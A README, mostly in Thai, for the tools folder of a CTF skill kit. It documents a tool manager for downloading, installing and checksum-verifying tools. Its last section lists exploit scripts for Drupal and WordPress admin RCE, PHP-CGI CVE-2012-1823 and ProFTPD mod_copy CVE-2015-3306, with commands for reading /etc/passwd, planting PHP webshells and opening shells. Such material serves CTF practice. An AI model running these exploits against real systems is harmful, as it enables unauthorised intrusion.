# External Tools Directory — Sunshine CTF Skill

โฟลเดอร์สำหรับจัดเก็บและจัดการเครื่องมือภายนอก (External Binaries, Scripts, Dictionaries, Analyzers) ที่ดาวน์โหลดมาเพิ่มเติมระหว่างการแข่งขัน CTF

## คำสั่งจัดการเครื่องมือ (`scripts/tool_manager.py`)

### 1. ตรวจสอบระบบปฏิบัติการและสภาพแวดล้อม (OS Awareness)
```bash
python scripts/tool_manager.py --os
python scripts/tool_manager.py --os --json
```
- รายงาน OS (Windows, Linux, macOS, WSL), Architecture, Python version, Shell ที่พร้อมใช้
- แนะนำชุดคำสั่งเทียบเคียงที่เหมาะกับ OS ปัจจุบันโดยอัตโนมัติ

### 2. ดูรายชื่อเครื่องมือที่ติดตั้งไว้ และ Presets ที่มีให้โหลด
```bash
python scripts/tool_manager.py list
```

### 3. ดาวน์โหลดเครื่องมือจาก URL ทั่วไป หรือ Git Repository
```bash
# โหลดไฟล์สคริปต์หรือ binary ตรงๆ
python scripts/tool_manager.py download --url <URL> [--name <filename>]

# โหลดไฟล์ Zip / Tar แล้วแตกไฟล์ลงโฟลเดอร์อัตโนมัติ
python scripts/tool_manager.py download --url <URL> --extract

# โคลนเครื่องมือจาก Git repo
python scripts/tool_manager.py git --repo <git_url> [--name <folder_name>]
```

### 4. ติดตั้ง Quick Presets ยอดนิยม
```bash
python scripts/tool_manager.py install strings-py      # สคริปต์ดึง printable strings ข้ามแพลตฟอร์ม (Windows/Linux/Mac)
python scripts/tool_manager.py install factordb        # CLI แยกตัวประกอบจำนวนเต็มผ่าน FactorDB API
python scripts/tool_manager.py install rockyou-10k     # Dictionary 10,000 รหัสผ่านยอดนิยม
python scripts/tool_manager.py install stegsolve       # Stegsolve JAR สำหรับวิเคราะห์รูปภาพ
python scripts/tool_manager.py install jwt_tool        # jwt_tool.py สำหรับวิเคราะห์และปลอม JWT
python scripts/tool_manager.py install cyberchef       # CyberChef Standalone Offline HTML
```

### 5. รันเครื่องมือจากโฟลเดอร์ `tools/`
```bash
python scripts/tool_manager.py run <tool_name> [args...]
# ตัวอย่าง:
python scripts/tool_manager.py run factordb 123456789
python scripts/tool_manager.py run strings.py challenge.bin -p "cspp|flag"
```

### 6. ตรวจสอบ Checksum (SHA-256)
ทุกครั้งที่ `download` / `install` จะมีการคำนวณ SHA-256 และบันทึกลง `tools/.checksums.json` อัตโนมัติ

```bash
# แสดง hash ของไฟล์หรือเครื่องมือ
python scripts/tool_manager.py checksum factordb
python scripts/tool_manager.py checksum --all

# ตรวจไฟล์ทั้งหมดเทียบ manifest (exit 1 ถ้าไฟล์หาย/ถูกแก้)
python scripts/tool_manager.py verify
python scripts/tool_manager.py verify --strict

# บังคับตรวจ hash ตอนโหลด/ติดตั้ง
python scripts/tool_manager.py download --url <URL> --sha256 <64-hex>
python scripts/tool_manager.py install jwt_tool --sha256 <64-hex>
```

- Hash ไม่ตรง = ไฟล์ถูกลบทิ้งและไม่ติดตั้ง
- ก่อนรัน binary ที่เพิ่งโหลดมา ควรรัน `verify` ก่อนทุกครั้ง

### 7. สคริปต์เฉพาะทางที่เพิ่มไว้ใน `tools/`
```bash
# Drupal admin -> module upload RCE (Drupal 8/9/10, ต้องมีสิทธิ์ administer modules)
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --cmd id
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --shell

# WordPress admin -> malicious plugin upload RCE (ต้องมีสิทธิ์ install_plugins)
python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --cmd id
python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --shell

# PHP-CGI argument injection CVE-2012-1823 (ดึง source ด้วย -s / RCE ด้วย -d)
python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --source
python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --cmd id

# ProFTPD mod_copy CVE-2015-3306 (copy ไฟล์ -> webroot -> HTTP)
python tools/proftpd_modcopy_cve_2015_3306.py --host target --read /etc/passwd --web http://target
python tools/proftpd_modcopy_cve_2015_3306.py --host target --cpfr /tmp/x.php --cpto /var/www/html/x.php
python tools/proftpd_modcopy_cve_2015_3306.py --host target --find-flag --web http://target
```
- Drupal: สร้างโมดูล PHP (`info.yml` + `routing.yml` + Controller `shell_exec`) แล้วอัปโหลดผ่าน `/admin/modules/install`, enable ที่ `/admin/modules`; route `GET /<module>?c=<cmd>`
- WordPress: สร้าง plugin zip แล้วอัปโหลดผ่าน `update.php?action=upload-plugin`; เรียก `GET /wp-content/plugins/<slug>/<slug>.php?c=<cmd>` (ไม่ต้อง activate)
- PHP-CGI: `?-s` แสดง source (highlighted) และ `?-d allow_url_include=on -d auto_prepend_file=php://input` + body PHP = RCE
- ProFTPD: `SITE CPFR`/`SITE CPTO` ใช้ได้ก่อน login; `--find-flag` ถอดชื่อไฟล์ที่สุ่มจาก timestamp (`btime + starttime/100`)
- ทำงานได้เมื่อ web user เขียนโฟลเดอร์ modules/ หรือ wp-content/plugins/ ได้ (typical CTF lab)
